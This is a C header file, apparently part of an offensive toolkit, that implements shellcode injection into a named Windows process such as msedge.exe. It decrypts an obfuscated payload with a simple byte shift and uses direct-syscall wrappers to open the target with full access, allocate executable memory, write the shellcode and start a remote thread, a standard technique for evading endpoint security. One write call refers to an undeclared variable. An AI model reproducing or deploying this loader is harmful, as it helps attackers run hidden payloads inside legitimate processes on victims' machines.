#pragma once 

#define UNICODE
#define _UNICODE

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <memoryapi.h>
#include <tlhelp32.h>
#include "syscalls.h"
#include "../../debug_print/debug_print.h"


#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER SpareLi1;
	LARGE_INTEGER SpareLi2;
	LARGE_INTEGER SpareLi3;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	ULONG BasePriority;
	HANDLE UniqueProcessId;
	ULONG InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG PageDirectoryBase;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION;

void custom_decrypt(unsigned char *buf, const int buf_length) {
	for(int i = 0; i < buf_length; i++) {
		buf[i] = buf[i] - 0xFE;
	}	
}

int FindTarget(const wchar_t* target_process) {

   	PVOID buffer = NULL;
	ULONG buffer_size = 0x10000;
	ULONG needed_size = 0;

	buffer = malloc(buffer_size);
	NTSTATUS status;

	while ((status = Sw3NtQuerySystemInformation(SystemProcessInformation, buffer, buffer_size, &needed_size)) == STATUS_INFO_LENGTH_MISMATCH) {
		buffer_size = needed_size;
		buffer = realloc(buffer, buffer_size);
	}

	if (!NT_SUCCESS(status)) {
		printf("Failed to query process information.\n");
		free(buffer);
		return 0;
	}

	SYSTEM_PROCESS_INFORMATION* spi = (SYSTEM_PROCESS_INFORMATION*)buffer;
	int pid = 0;

	do {
		if (spi->ImageName.Buffer && wcscmp(spi->ImageName.Buffer, target_process) == 0) {
			pid = (int)spi->UniqueProcessId;
			break;
		}
		spi = (SYSTEM_PROCESS_INFORMATION*)((char*)spi + spi->NextEntryOffset);
	} while (spi->NextEntryOffset != 0);

	free(buffer);
	return pid;

}

// payload_info format:     msedge.exe
// the name specifies the process to inject the shellcode into.
void inject_shellcode_procname_syscalls(unsigned char *shellcode, int shellcode_size, char *payload_info) {
    DEBUG_PRINT("Starting inject_shellcode_procname_syscalls routine...\n");  
    
    
    int target_pid = 0;
    wchar_t target_process[256]; // Assuming payload_info is less than 256 characters
    mbstowcs(target_process, payload_info, 256); // Convert char* to wchar_t*


    // Setup for calling NtOpenProcess
    HANDLE hThread, hProc;
	OBJECT_ATTRIBUTES object_attributes;
	CLIENT_ID clientId;

    LPVOID remote_process_buffer = NULL;
	LPVOID buf_pointer = shellcode;
	SIZE_T buf_len = shellcode_size;

    DEBUG_PRINT("Extracted payload_info::process_name argument = %s\n", target_process);

    DEBUG_PRINT("Finding target PID...\n");
    target_pid = FindTarget(target_process);

    if (target_pid == 0){
        DEBUG_PRINT("Failed to find PID of targeted process.\n");
        return;
    }

    clientId.UniqueProcess = (HANDLE)target_pid;
    clientId.UniqueThread = 0;

    InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);

    // Access target process
    DEBUG_PRINT("Accessing target process...\n");
    Sw3NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &clientId);

    // Allocate target memory for the shellcode
    DEBUG_PRINT("Allocating memory in target process...\n");

    Sw3NtAllocateVirtualMemory(hProc, &remote_process_buffer, 0, (PULONG)&buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    DEBUG_PRINT("Decrypting payload\n");
    // Decrypt payload
    custom_decrypt(shellcode, shellcode_size);

    // Write shellcode into allocated target buffer
    DEBUG_PRINT("Writing shellcode into allocated target buffer...\n");    
    Sw3NtWriteVirtualMemory(hProc, remote_process_buffer, buf_pointer, sizeof(buf), 0);
    
    // Create and start new thread in the remote process, executing the shellcode
    DEBUG_PRINT("Creating new remote thread to execute shellcode...\n");
    Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)remote_process_buffer, NULL, FALSE, NULL, NULL, NULL, NULL);

	WaitForSingleObject(hProc, INFINITE);

	// Close handle of the opened process
	CloseHandle(hProc);
}
